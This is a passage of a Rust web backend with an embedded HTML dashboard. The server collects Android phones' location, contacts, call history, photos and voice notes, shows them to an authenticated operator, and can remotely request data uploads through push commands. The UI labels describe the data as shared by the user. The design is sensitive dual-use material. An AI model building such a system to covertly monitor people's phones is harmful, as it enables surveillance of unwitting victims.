                        "Could not delete photos".to_string(),
                    )
                })?;
        }
        "voice" => {
            sqlx::query("DELETE FROM device_media WHERE device_id = $1 AND media_type = 'voice'")
                .bind(&path.device_id)
                .execute(&state.db)
                .await
                .map_err(|_| {
                    (
                        StatusCode::INTERNAL_SERVER_ERROR,
                        "Could not delete voice notes".to_string(),
                    )
                })?;
        }
        "contacts" => {
            sqlx::query("DELETE FROM device_contacts WHERE device_id = $1")
                .bind(&path.device_id)
                .execute(&state.db)
                .await
                .map_err(|_| {
                    (
                        StatusCode::INTERNAL_SERVER_ERROR,
                        "Could not delete contacts".to_string(),
                    )
                })?;
        }
        "call_history" => {
            sqlx::query("DELETE FROM device_call_history WHERE device_id = $1")
                .bind(&path.device_id)
                .execute(&state.db)
                .await
                .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete call history".to_string()))?;
        }
        "all" => {
            let mut transaction = state.db.begin().await.map_err(|_| {
                (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    "Could not start delete transaction".to_string(),
                )
            })?;
            sqlx::query("DELETE FROM device_media WHERE device_id = $1")
                .bind(&path.device_id)
                .execute(&mut *transaction)
                .await
                .map_err(|_| {
                    (
                        StatusCode::INTERNAL_SERVER_ERROR,
                        "Could not delete saved media".to_string(),
                    )
                })?;
            sqlx::query("DELETE FROM device_contacts WHERE device_id = $1")
                .bind(&path.device_id)
                .execute(&mut *transaction)
                .await
                .map_err(|_| {
                    (
                        StatusCode::INTERNAL_SERVER_ERROR,
                        "Could not delete saved contacts".to_string(),
                    )
                })?;
            sqlx::query("DELETE FROM device_call_history WHERE device_id = $1")
                .bind(&path.device_id)
                .execute(&mut *transaction)
                .await
                .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not delete saved call history".to_string()))?;
            transaction.commit().await.map_err(|_| {
                (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    "Could not finish delete transaction".to_string(),
                )
            })?;
        }
        _ => return Err((StatusCode::BAD_REQUEST, "Unsupported delete scope".to_string())),
    }
    Ok(Json(LocateResponse {
        message: format!("Deleted {}", path.scope),
    }))
}

async fn device_details_page(
    Path(device_id): Path<String>,
    headers: HeaderMap,
) -> Result<Html<String>, DashboardAuthError> {
    require_dashboard_auth(&headers)?;
    Ok(Html(format!(
        r#"<!doctype html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Device details</title>
  <style>
    :root {{ color-scheme: dark; font-family: Inter,system-ui,sans-serif; }}
    body {{ margin: 0; background: #10131a; color: #eef2ff; }}
    main {{ max-width: 1120px; margin: 0 auto; padding: 32px 20px; }}
    a {{ color: #75a1ff; }} .muted {{ color: #aab5cd; }}
    section {{ margin: 18px 0; padding: 16px; background: #171d29; border: 1px solid #30394c; border-radius: 10px; }}
    table {{ width: 100%; border-collapse: collapse; }} th,td {{ text-align: left; padding: 10px; border-bottom: 1px solid #30394c; vertical-align: top; }}
    img {{ max-width: 260px; border-radius: 8px; display: block; margin: 8px 0; }}
    audio {{ width: 280px; max-width: 100%; }}
    button {{ min-height: 34px; padding: 8px 11px; border: 0; border-radius: 8px; background: #253047; color: #eef2ff; cursor: pointer; font-weight: 700; }}
    button.danger {{ background: #d75067; }}
    .section-head {{ display: flex; justify-content: space-between; gap: 12px; align-items: center; margin-bottom: 10px; }}
    .media-grid {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 14px; }}
    .media-card {{ padding: 12px; border: 1px solid #30394c; border-radius: 8px; background: #121824; }}
    .item-actions {{ margin-top: 8px; }}
    #message {{ min-height: 20px; color: #aab5cd; }}
  </style>
</head>
<body>
  <main>
    <a href="/">Back to dashboard</a>
    <h1>Device details</h1>
    <p class="muted" id="device-id"></p>
    <p id="message"></p>
    <section id="phone"><div class="section-head"><h2>Phone</h2><button class="danger" onclick="deleteScope('all')">Delete All Saved Data</button></div><div id="phone-content">Loading...</div></section>
    <section id="contacts"><div class="section-head"><h2>Contacts Shared By User</h2><button class="danger" onclick="deleteScope('contacts')">Delete All Contacts</button></div><div id="contacts-content">Loading...</div></section>
    <section id="calls"><div class="section-head"><h2>Current Call History</h2><button class="danger" onclick="deleteScope('call_history')">Delete Call History</button></div><div id="calls-content">Loading...</div></section>
    <section id="photos"><div class="section-head"><h2>Photos Shared By User</h2><button class="danger" onclick="deleteScope('photos')">Delete All Photos</button></div><div id="photos-content">Loading...</div></section>
    <section id="voice"><div class="section-head"><h2>Voice Notes Shared By User</h2><button class="danger" onclick="deleteScope('voice')">Delete All Voice</button></div><div id="voice-content">Loading...</div></section>
  </main>
  <script>
    const deviceId = {device_id:?};
    const byId = id => document.getElementById(id);
    const message = value => byId('message').textContent = value || '';
    const escape = value => {{
      const span = document.createElement('span');
      span.textContent = value ?? '-';
      return span.innerHTML;
    }};
    const text = value => escape(value);
    let didInitialScroll = false;
    document.getElementById('device-id').textContent = deviceId;
    function audioIsPlaying() {{
      return Array.from(document.querySelectorAll('audio')).some(audio => !audio.paused && !audio.ended);
    }}
    function scrollToRequestedSection() {{
      if (didInitialScroll || !location.hash) return;
      const target = document.getElementById(location.hash.slice(1));
      if (!target) return;
      didInitialScroll = true;
      requestAnimationFrame(() => target.scrollIntoView({{behavior:'smooth', block:'start'}}));
    }}
    async function load() {{
      if (audioIsPlaying()) return;
      const response = await fetch('/devices/'+encodeURIComponent(deviceId)+'/details-data?t='+Date.now(), {{cache:'no-store'}});
      const data = await response.json();
      byId('phone-content').innerHTML = `<table><tr><th>Manufacturer</th><td>${{text(data.device.manufacturer)}}</td></tr><tr><th>Model</th><td>${{text(data.device.model)}}</td></tr><tr><th>Android</th><td>${{text(data.device.android_version)}}</td></tr><tr><th>Last seen</th><td>${{text(data.device.last_seen)}}</td></tr></table>`;
      byId('contacts-content').innerHTML = data.contacts.length ? `<table><thead><tr><th>Name</th><th>Phone</th><th>Action</th></tr></thead><tbody>${{data.contacts.map(c=>`<tr><td>${{text(c.name)}}</td><td>${{text(c.phone)}}</td><td><button class="danger" onclick="deleteContact(${{c.id}})">Delete</button></td></tr>`).join('')}}</tbody></table>` : '<p class="muted">No contacts uploaded yet.</p>';
      const callCounts = data.calls.reduce((counts, call) => {{ const key = call.phone_number || call.cached_name || 'unknown'; counts[key] = (counts[key] || 0) + 1; return counts; }}, {{}});
      byId('calls-content').innerHTML = data.calls.length ? `<table><thead><tr><th>Name / Number</th><th>Type</th><th>When</th><th>Duration</th><th>Calls in snapshot</th></tr></thead><tbody>${{data.calls.map(c=>{{ const key = c.phone_number || c.cached_name || 'unknown'; return `<tr><td>${{text(c.cached_name || c.phone_number)}}</td><td>${{text(c.call_type)}}</td><td>${{new Date(c.called_at_ms).toLocaleString()}}</td><td>${{Math.floor(c.duration_seconds / 60)}}m ${{c.duration_seconds % 60}}s</td><td>${{callCounts[key]}}</td></tr>`; }}).join('')}}</tbody></table>` : '<p class="muted">No call-history snapshot uploaded yet.</p>';
      const photos = data.media.filter(m=>m.media_type==='photo');
      byId('photos-content').innerHTML = photos.length ? `<div class="media-grid">${{photos.map(m=>`<div class="media-card"><small>${{text(m.created_at)}}</small><img src="data:${{text(m.content_type)}};base64,${{m.base64_data}}" alt="Shared photo"><div class="item-actions"><button class="danger" onclick="deleteMedia(${{m.id}})">Delete</button></div></div>`).join('')}}</div>` : '<p class="muted">No photos uploaded yet.</p>';
      const voice = data.media.filter(m=>m.media_type==='voice');
      byId('voice-content').innerHTML = voice.length ? `<div class="media-grid">${{voice.map(m=>`<div class="media-card"><small>${{text(m.created_at)}}</small><br><audio controls preload="metadata" src="data:${{text(m.content_type)}};base64,${{m.base64_data}}"></audio><div class="item-actions"><button class="danger" onclick="deleteMedia(${{m.id}})">Delete</button></div></div>`).join('')}}</div>` : '<p class="muted">No voice notes uploaded yet.</p>';
      scrollToRequestedSection();
    }}
    async function deleteRequest(url, label) {{
      if (!confirm(label)) return;
      const response = await fetch(url, {{method:'DELETE', cache:'no-store'}});
      if (!response.ok) {{
        message(await response.text() || 'Delete failed');
        return;
      }}
      message('Deleted. Refreshing...');
      await load();
      setTimeout(() => message(''), 1500);
    }}
    function deleteContact(id) {{
      deleteRequest('/devices/'+encodeURIComponent(deviceId)+'/details/contacts/'+id, 'Delete this contact?');
    }}
    function deleteMedia(id) {{
      deleteRequest('/devices/'+encodeURIComponent(deviceId)+'/details/media/'+id, 'Delete this saved item?');
    }}
    function deleteScope(scope) {{
      const labels = {{photos:'all photos', voice:'all voice notes', contacts:'all contacts', call_history:'current call history', all:'all saved photos, voice notes, contacts, and call history'}};
      deleteRequest('/devices/'+encodeURIComponent(deviceId)+'/details/'+scope, 'Delete '+(labels[scope] || scope)+'?');
    }}
    load();
    setInterval(load, 3000);
  </script>
</body>
</html>"#,
    )))
}

async fn device_details_data(
    State(state): State<AppState>,
    Path(device_id): Path<String>,
    headers: HeaderMap,
) -> Result<Json<serde_json::Value>, DashboardAuthError> {
    require_dashboard_auth(&headers)?;
    let device = sqlx::query(
        "
        SELECT device_id, manufacturer, model, android_version, last_seen
        FROM devices
        WHERE device_id = $1
        ",
    )
    .bind(&device_id)
    .fetch_optional(&state.db)
    .await
    .unwrap();
    let Some(device) = device else {
        return Ok(Json(serde_json::json!({
            "device": { "device_id": device_id },
            "contacts": [],
            "calls": [],
            "media": []
        })));
    };
    let contacts = sqlx::query(
        "
        SELECT id, name, phone
        FROM device_contacts
        WHERE device_id = $1
        ORDER BY COALESCE(name, phone)
        ",
    )
    .bind(&device_id)
    .fetch_all(&state.db)
    .await
    .unwrap();
    let media = sqlx::query(
        "
        SELECT id, media_type, content_type, base64_data, created_at
        FROM device_media
        WHERE device_id = $1
        ORDER BY created_at DESC
        LIMIT 100
        ",
    )
    .bind(&device_id)
    .fetch_all(&state.db)
    .await
    .unwrap();
    let calls = sqlx::query(
        "SELECT cached_name, phone_number, call_type, called_at_ms, duration_seconds FROM device_call_history WHERE device_id = $1 ORDER BY called_at_ms DESC LIMIT 100",
    )
    .bind(&device_id)
    .fetch_all(&state.db)
    .await
    .unwrap();

    Ok(Json(serde_json::json!({
        "device": {
            "device_id": device.get::<String, _>("device_id"),
            "manufacturer": device.get::<Option<String>, _>("manufacturer"),
            "model": device.get::<Option<String>, _>("model"),
            "android_version": device.get::<Option<String>, _>("android_version"),
            "last_seen": device.get::<Option<chrono::NaiveDateTime>, _>("last_seen")
        },
        "contacts": contacts.into_iter().map(|row| serde_json::json!({
            "id": row.get::<i32, _>("id"),
            "name": row.get::<Option<String>, _>("name"),
            "phone": row.get::<Option<String>, _>("phone")
        })).collect::<Vec<_>>(),
        "calls": calls.into_iter().map(|row| serde_json::json!({
            "cached_name": row.get::<Option<String>, _>("cached_name"),
            "phone_number": row.get::<Option<String>, _>("phone_number"),
            "call_type": row.get::<String, _>("call_type"),
            "called_at_ms": row.get::<i64, _>("called_at_ms"),
            "duration_seconds": row.get::<i64, _>("duration_seconds")
        })).collect::<Vec<_>>(),
        "media": media.into_iter().map(|row| serde_json::json!({
            "id": row.get::<i32, _>("id"),
            "media_type": row.get::<String, _>("media_type"),
            "content_type": row.get::<String, _>("content_type"),
            "base64_data": row.get::<String, _>("base64_data"),
            "created_at": row.get::<chrono::NaiveDateTime, _>("created_at")
        })).collect::<Vec<_>>()
    })))
}

async fn list_devices(
    State(state): State<AppState>,
    headers: HeaderMap,
) -> Result<Json<Vec<Device>>, DashboardAuthError> {
    require_dashboard_auth(&headers)?;
    let devices = sqlx::query_as::<_, Device>(
        //GET /devices now returns location.
        "
        SELECT
          device_id,
          manufacturer,
          model,
          android_version,
          latitude, 
          longitude,
          location_accuracy_meters,
          location_time,
          last_command_status,
          last_command_status_time,
          last_seen,
          (fcm_token IS NOT NULL) AS command_ready,
          COALESCE(last_seen > NOW() - INTERVAL '5 seconds',false) AS online 
        FROM devices
        ",
    )
    .fetch_all(&state.db)
    .await
    .unwrap();
    Ok(Json(devices))
}

async fn list_online_devices(
    State(state): State<AppState>,
    headers: HeaderMap,
) -> Result<Json<Vec<Device>>, DashboardAuthError> {
    require_dashboard_auth(&headers)?;
    let devices = sqlx::query_as::<_, Device>(
        "
        SELECT
          device_id,
          manufacturer,
          model,
          android_version,
          latitude,
          longitude,
          location_accuracy_meters,
          location_time,
          last_command_status,
          last_command_status_time,
          last_seen,
          (fcm_token IS NOT NULL) AS command_ready,
          true AS online
        FROM devices
        WHERE last_seen > NOW() - INTERVAL '5 seconds'
        ",
    )
    .fetch_all(&state.db)
    .await
    .unwrap();
    Ok(Json(devices))
}

#[tokio::main]
async fn main() // this mark the pogram entry point and enable aync rust using tokio
               { 
    let db = connect_db().await; //connect to postgress

    sqlx::query(
        //ensure required colums exist in the devices table
        "
        ALTER TABLE devices
        ADD COLUMN IF NOT EXISTS manufacturer TEXT,
        ADD COLUMN IF NOT EXISTS model TEXT,
        ADD COLUMN IF NOT EXISTS android_version TEXT,
        ADD COLUMN IF NOT EXISTS latitude DOUBLE PRECISION,
        ADD COLUMN IF NOT EXISTS longitude DOUBLE PRECISION,
        ADD COLUMN IF NOT EXISTS location_accuracy_meters DOUBLE PRECISION,
        ADD COLUMN IF NOT EXISTS location_time TIMESTAMP,
        ADD COLUMN IF NOT EXISTS last_command_status TEXT,
        ADD COLUMN IF NOT EXISTS last_command_status_time TIMESTAMP,
        ADD COLUMN IF NOT EXISTS fcm_token TEXT
        ",
    )
    .execute(&db)
    .await
    .expect("Failed to ensure device info columns");

    sqlx::query(
        "
        CREATE TABLE IF NOT EXISTS device_contacts (
            id SERIAL PRIMARY KEY,
            device_id TEXT NOT NULL,
            name TEXT,
            phone TEXT
        )
        ",
    )
    .execute(&db)
    .await
    .expect("Failed to ensure device contacts table");

    sqlx::query(
        "
        CREATE TABLE IF NOT EXISTS device_media (
            id SERIAL PRIMARY KEY,
            device_id TEXT NOT NULL,
            media_type TEXT NOT NULL,
            content_type TEXT NOT NULL,
            base64_data TEXT NOT NULL,
            created_at TIMESTAMP NOT NULL DEFAULT NOW()
        )
        ",
    )
    .execute(&db)
    .await
    .expect("Failed to ensure device media table");

    sqlx::query(
        "
        CREATE TABLE IF NOT EXISTS device_capability_requests (
            id SERIAL PRIMARY KEY,
            device_id TEXT NOT NULL,
            capability TEXT NOT NULL,
            requested_at TIMESTAMP NOT NULL DEFAULT NOW(),
            fulfilled_at TIMESTAMP
        )
        ",
    )
    .execute(&db)
    .await
    .expect("Failed to ensure device capability requests table");

    sqlx::query(
        "
        CREATE TABLE IF NOT EXISTS device_call_history (
            id SERIAL PRIMARY KEY,
            device_id TEXT NOT NULL,
            cached_name TEXT,
            phone_number TEXT,
            call_type TEXT NOT NULL,
            called_at_ms BIGINT NOT NULL,
            duration_seconds BIGINT NOT NULL
        )
        ",
    )
    .execute(&db)
    .await
    .expect("Failed to ensure device call-history table");

    let state = AppState { db }; //Stores the DB pool in app State

    let app = Router::new() //creates the HTTP router

    //ALL this will connect URLs to rust function
        .route("/", get(dashboard))
        .route("/health", get(health))
        .route("/register", post(register))
        .route("/devices", get(list_devices))
        .route("/devices/online", get(list_online_devices))
        .route("/devices/fcm-token", post(register_fcm_token))
        .route("/devices/location-status", post(update_location_command_status))
        .route("/devices/phone-details", post(update_phone_details))
        .route("/devices/contacts", post(upload_contacts))
        .route("/devices/call-history", post(upload_call_history))
        .route("/devices/media", post(upload_media))
        .route("/devices/{device_id}/details", get(device_details_page))
        .route("/devices/{device_id}/details-data", get(device_details_data))
        .route(
            "/devices/{device_id}/details/{scope}",
            delete(delete_detail_scope),
        )
        .route(
            "/devices/{device_id}/details/contacts/{id}",
            delete(delete_detail_contact),
        )
        .route(
            "/devices/{device_id}/details/media/{id}",
            delete(delete_detail_media),
        )
        .route(
            "/devices/{device_id}/locate",
            post(request_location_command),
        )
        .route(
            "/devices/{device_id}/permissions/{permission}/status",
            post(request_permission_status_command),
        )
        .route(
            "/devices/{device_id}/capabilities/{capability}/request",
            post(request_capability_upload_command),
        )
        .route("/devices/{device_id}", delete(delete_device))
        .route("/heartbeat", post(heartbeat))
        .route("/location", post(update_location)) //Connects POST /location URL to update_location function.
        .with_state(state);

    let port = env::var("PORT").unwrap_or_else(|_| "3000".to_string());
    let bind_addr = format!("0.0.0.0:{port}");
    let listener = tokio::net::TcpListener::bind(&bind_addr).await.unwrap();

    println!("server running on http://{bind_addr}");

    axum::serve(listener, app).await.unwrap(); //runs the web server forever
}

/*AndroidManifest.xml
allows location permission

MainActivity.kt
asks permission + reads location

LocationRequest.kt
defines location JSON

ApiService.kt
sends location JSON to POST /location

backend main.rs
receives and stores location

device.rs
returns location from GET /devices */
